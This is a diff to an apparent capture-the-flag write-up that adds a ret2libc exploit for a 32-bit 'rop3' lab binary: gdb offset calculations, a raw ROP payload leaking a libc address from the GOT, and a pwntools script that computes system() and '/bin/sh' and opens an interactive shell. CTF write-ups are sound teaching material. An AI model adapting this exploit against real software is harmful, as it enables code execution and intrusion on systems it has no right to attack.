@@ -125,7 +125,7 @@ $2 = {<text variable, no debug info>} 0xf7e63190 <system>
 gdb-peda$ p 0xf7efdbd0-0xf7e63190
 $3 = 0x9aa40
 ```
-address of `system()` is **lower** than `read()` by 0x9aa40
+Address of `system()` is **lower** than `read()` by 0x9aa40
 ```
 gdb-peda$ find /bin/sh
 Searching for '/bin/sh' in: None ranges
@@ -134,7 +134,15 @@ libc : 0xf7f83a24 ("/bin/sh")
 gdb-peda$ p 0xf7f83a24-0xf7efdbd0
 $5 = 0x85e54
 ```
-address of /bin/sh is **greater** than `read()` by 0x85e54.
+Address of /bin/sh is **greater** than `read()` by 0x85e54.
+Now we need to change the "AAAA" in our exploit to the address of
+`vulnerable_function()`. This will retrigger the vulnerability, enabling us to
+calculate the address of 'system()' and "/bin/sh" and make the appropriate
+function call.
+```
+python -c 'print "A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08" + "\x01\x00\x00\x00" +
+"\x00\xa0\x04\x08" + "\x04\x00\x00\x00"' | ./rop3-7f3312fe43c46d26
+```
 
 At this point, we'll need to use pwntools. You can install it with:
 ```
@@ -144,9 +152,41 @@ sudo pip install pwntools
 Here's why. Once we have that leaked address we can do some napkin math to
 calculate the address of `system()`. **ASLR only randomises the base address of
 libc. This means that `system()` is always the same distance from `read()` or
-`write()` at any given runtime**. pwntools can do that math for us.
+`write()` at any given runtime**. pwntools can do that math for us. We can
+start our python script as such:
+```python
 
+from pwn import *
+context(arch='i386', os='linux')
+#conventions for pwntools ^
 
+first_part = ("A"*140 + "\xa0\x83\x04\x08" + "\x74\x84\x04\x08"
++ "\x01\x00\x00\x00" + "\x00\xa0\x04\x08" + "\x04\x00\x00\x00" )
+# our exploit so far ^
+r = process("./rop3-7f3312fe43c46d26", shell=True) #executes the binary
+r.sendline(first_part ) #feeds the exploit to the binary
+a=unpack(r.recv(4)) #gets the four bytes we leaked from the GOT
+print hex(a)
+```
+if you run this a few times the address should vary from run to run.
+This is a good thing, it means that you're getting the random libc address.
+From here, you can calculate the addresses we found before in gdb by adding
+these lines.
+```python
+system_address=a-0x9aa40
+binsh_address = a+0x85e54
+
+r.sendline("A"*140+pack(system_address)+"JUNK"+pack(binsh_address))
+
+""" The above line sends 140 bytes of padding, the little endian form of
+    system_address, a bogus return address, and the little endian form of the
+    address of /bin/sh. The pack() function just turns the integer into an escape
+    sequence for us
+"""
+r.interactive() # This just enables you to type things in to your shell :)
+```
+
+pwned.
 ## Other write-ups and resources
 
 * none yet
